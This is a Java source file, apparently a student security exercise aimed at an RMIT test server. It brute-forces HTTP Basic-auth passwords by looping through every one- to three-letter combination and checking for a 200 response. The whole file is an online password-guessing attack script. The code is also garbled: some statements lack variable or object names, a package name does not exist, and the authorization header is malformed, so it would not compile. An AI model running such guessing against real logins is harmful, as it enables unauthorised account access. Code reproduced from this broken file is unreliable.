

import java.awt.*;
import java.util.*;
import java.net.*;
import java.io.*;
import java.*;

 
public class BruteForce 
{
    public final char [ ]  letter = {
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',   
        'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',   
        'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',   
        'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',   
        'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',   
        'o', 'p', 'q', 'r', 's', 't', 'u', 'v',   
        'w', 'x', 'y', 'z'};			  


    public static void main(String args[]) throws Exception
    {
       
        String urlPath = null;
        
        if(args.length > 0)
        {
            urlPath = args[0];
            System.out.println("URL " + urlPath);
            BruteForce bForce = new BruteForce(urlPath);            
        }
        else{
            System.out.println("Please enter URL at command prompt");
            System.out.println("eg. >java BruteForce http://sec-crack.cs.rmit.edu./SEC/2/");
        }

        System.exit(0);

    }

    
    public BruteForce(String urlPath) throws Exception
    {
        linkToWeb(urlPath);

    }

    public boolean linkToWeb(String urlPath) throws Exception
    {
        HttpURLConnection connection;
        int i, j, k; 
        URL  = new URL(urlPath);
        String let1 = null;
        String let2 = null;
        String let3 = null;
        String usrName = "";
        String usrNamePwd = null;
        String encoding = null;
        boolean ok = false;

        connection = (HttpURLConnection).openConnection();        

      

        for(i=0; i<String.valueOf(letter).length(); i++) {
            let1 = String.valueOf(letter[i]);		

            usrNamePwd = usrName +":"+ let1;
            encoding = new url.misc.BASE64Encoder().encode (usrNamePwd.getBytes());
            connection.setRequestProperty("Authorization", " " + encoding);

            System.out.println(let1);
            if(connection.getResponseCode() == 200){
                System.out.println("Password Found " +let1); 
                return true;
            }
            connection.disconnect();

            for(j=0; j<String.valueOf(letter).length(); j++) {
                let2 = let1 + letter[j];		

                usrNamePwd = usrName +":"+ let2;
                encoding = new url.misc.BASE64Encoder().encode (usrNamePwd.getBytes());

                connection = (HttpURLConnection).openConnection();
                connection.setRequestProperty("Authorization", " " + encoding);

                if(connection.getResponseCode() == 200){
                    System.out.println("Password Found " +let2);
                    return true;
                }
                connection.disconnect();

                System.out.println(let2);

                for(k=0; k<String.valueOf(letter).length(); k++) {
                    let3 = let2 + letter[k];             
                     
                    usrNamePwd = usrName +":"+ let3;
                    encoding = new url.misc.BASE64Encoder().encode (usrNamePwd.getBytes());
 
                    connection = (HttpURLConnection).openConnection();
                    connection.setRequestProperty("Authorization", " " + encoding);

                    if(connection.getResponseCode() == 200){
                       System.out.println("Password Found " +let3);
                       return true;
                    }
           
                    connection.disconnect();
                    System.out.println(let3);
                    
                }
            }

        }

        System.out.println("Password not found" );
        return false;

    }



    public class  Base64Converter
    {

     public final char [ ]  alphabet = {
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',   
        'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',   
        'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',   
        'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',   
        'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',   
        'o', 'p', 'q', 'r', 's', 't', 'u', 'v',   
        'w', 'x', 'y', 'z', '0', '1', '2', '3',   
        '4', '5', '6', '7', '8', '9', '+', '/' }; 

     public String  encode ( String  s )
     {
        return encode ( s.getBytes ( ) );
     }

     public String  encode ( byte [ ]  octetString )
     {
        int  bits24;
        int  bits6;

       char [ ]  out
          = new char [ ( ( octetString.length - 1 ) / 3 + 1 ) * 4 ];

       int outIndex = 0;
        int i        = 0;

       while ( ( i + 3 ) <= octetString.length )
        {
          
          bits24  = ( octetString [ i++ ] & 0xFF ) << 16; 
          bits24 |= ( octetString [ i++ ] & 0xFF ) <<  8; 
          bits24 |= ( octetString [ i++ ] & 0xFF ) <<  0;

         bits6 = ( bits24 & 0x00FC0000 ) >> 18; 
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x0003F000 ) >> 12; 
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x00000FC0 ) >> 6; 
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x0000003F );
          out [ outIndex++ ] = alphabet [ bits6 ]; 
        }

       if ( octetString.length - i == 2 )
        {
          
          bits24  = ( octetString [ i     ] & 0xFF ) << 16; 
          bits24 |= ( octetString [ i + 1 ] & 0xFF ) <<  8;

         bits6 = ( bits24 & 0x00FC0000 ) >> 18;
          out [ outIndex++ ] = alphabet [ bits6 ]; 
          bits6 = ( bits24 & 0x0003F000 ) >> 12; 
          out [ outIndex++ ] = alphabet [ bits6 ]; 
          bits6 = ( bits24 & 0x00000FC0 ) >> 6; 
          out [ outIndex++ ] = alphabet [ bits6 ];

         
          out [ outIndex++ ] = '='; 
        }
        else if ( octetString.length - i == 1 )
        {
          
          bits24 = ( octetString [ i ] & 0xFF ) << 16;

         bits6 = ( bits24 & 0x00FC0000 ) >> 18;
          out [ outIndex++ ] = alphabet [ bits6 ];
          bits6 = ( bits24 & 0x0003F000 ) >> 12; 
          out [ outIndex++ ] = alphabet [ bits6 ];

         
          out [ outIndex++ ] = '='; 
          out [ outIndex++ ] = '='; 
        }

       return new String ( out );
      }

    }
    
}

